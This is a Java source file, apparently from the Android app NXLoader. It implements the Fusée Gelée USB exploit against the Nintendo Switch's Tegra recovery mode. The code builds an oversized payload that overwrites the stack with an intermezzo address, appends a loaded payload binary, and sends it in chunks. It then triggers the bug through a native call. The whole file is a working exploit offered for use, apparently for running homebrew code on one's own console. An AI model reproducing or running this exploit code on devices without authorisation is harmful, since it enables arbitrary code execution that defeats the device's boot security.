package io.github.davidbuchanan314.nxloader;

/*
 * This exploit is based on fusée gelée: https://github.com/reswitched/fusee-launcher
 */

import android.content.Context;
import android.content.SharedPreferences;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbEndpoint;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class PrimaryLoader implements USBDevHandler {
    private static final int RCM_PAYLOAD_ADDR = 0x40010000;
    private static final int INTERMEZZO_LOCATION = 0x4001F000;
    private static final int PAYLOAD_LOAD_BLOCK = 0x40020000;
    private static final int MAX_LENGTH = 0x30298;

    // Used to load the 'native-lib' library on startup.
    static {
        System.loadLibrary("native-lib");
    }

    public void handleDevice(Context context, UsbDevice device) {
        Logger.log(context, "[+] Launching primary payload!!!");

        UsbManager mUsbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
        UsbInterface intf = device.getInterface(0);
        UsbEndpoint endpoint_in = intf.getEndpoint(0);
        UsbEndpoint endpoint_out = intf.getEndpoint(1);
        UsbDeviceConnection conn = mUsbManager.openDevice(device);
        conn.claimInterface(intf, true);

        /* Step 1: Read device ID */

        byte[] deviceID = new byte[16];
        if (conn.bulkTransfer(endpoint_in, deviceID, deviceID.length, 999) != deviceID.length) {
            Logger.log(context, "[-] Failed to read device ID, bailing out :(");
            return;
        }

        Logger.log(context, "[+] Read device ID: " + Utils.bytesToHex(deviceID));

        /* Step 2: Start building payload */

        ByteBuffer payload = ByteBuffer.allocate(MAX_LENGTH);
        payload.order(ByteOrder.LITTLE_ENDIAN);

        payload.putInt(MAX_LENGTH);
        payload.put(new byte[676]);

        // smash the stack with the address of the intermezzo
        for (int i = RCM_PAYLOAD_ADDR; i < INTERMEZZO_LOCATION; i += 4) {
            payload.putInt(INTERMEZZO_LOCATION);
        }

        byte[] intermezzo;
        try {
            InputStream intermezzoStream = context.getAssets().open("intermezzo.bin");
            intermezzo = new byte[intermezzoStream.available()];
            intermezzoStream.read(intermezzo);
            intermezzoStream.close();
        } catch (IOException e) {
            Logger.log(context, "[-] Failed to read intermezzo: " + e.toString());
            return;
        }
        payload.put(intermezzo);

        // pad until payload
        payload.put(new byte[PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION - intermezzo.length]);

        // write the actual payload file
        try {
            payload.put(getPayload(context));
        } catch (IOException e) {
            Logger.log(context, "[-] Failed to read payload: " + e.toString());
            return;
        }

        int unpadded_length = payload.position();
        payload.position(0);
        // always end on a high buffer
        boolean low_buffer = true;
        byte[] chunk = new byte[0x1000];
        int bytes_sent;
        for (bytes_sent = 0; bytes_sent < unpadded_length || low_buffer; bytes_sent += 0x1000) {
            payload.get(chunk);
            if (conn.bulkTransfer(endpoint_out, chunk, chunk.length, 999) != chunk.length) {
                Logger.log(context, "[-] Sending payload failed at offset " + Integer.toString(bytes_sent));
                return;
            }
            low_buffer ^= true;
        }

        Logger.log(context, "[+] Sent " + Integer.toString(bytes_sent) + " bytes");

        // 0x7000 = STACK_END = high DMA buffer address
        switch (nativeTriggerExploit(conn.getFileDescriptor(), 0x7000)) {
            case 0:
                Logger.log(context, "[+] Exploit triggered!");
                break;
            case -1:
                Logger.log(context, "[-] SUBMITURB failed :(");
                break;
            case -2:
                Logger.log(context, "[-] DISCARDURB failed :(");
                break;
            case -3:
                Logger.log(context, "[-] REAPURB failed :(");
                break;
            case -4:
                Logger.log(context, "[-] Wrong URB reaped :( Maybe that doesn't matter?");
                break;
            default:
                Logger.log(context, "[-] How did you get here!?");
                return;
        }

        conn.releaseInterface(intf);
        conn.close();
    }

    private byte[] getPayload(Context context) throws IOException {
        SharedPreferences prefs = context.getSharedPreferences("config", Context.MODE_MULTI_PROCESS);
        String payload_name = prefs.getString(Constants.PREFERENCES_KEY, null);
        InputStream payload_file;

        if (payload_name == null) {
            Logger.log(context, "[*] Opening default payload (fusee.bin)");
            payload_file = context.getAssets().open("fusee.bin");
        } else {
            Logger.log(context, "[*] Opening custom payload (" + payload_name + ")");
            payload_file = new FileInputStream(context.getFilesDir().getPath() + "/payload.bin");
        }

        byte[] payload_data = new byte[payload_file.available()];
        Logger.log(context, "[+] Read " + Integer.toString(payload_file.read(payload_data)) + " bytes from payload file");
        payload_file.close();
        return payload_data;
    }

    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native int nativeTriggerExploit(int fd, int length);
}
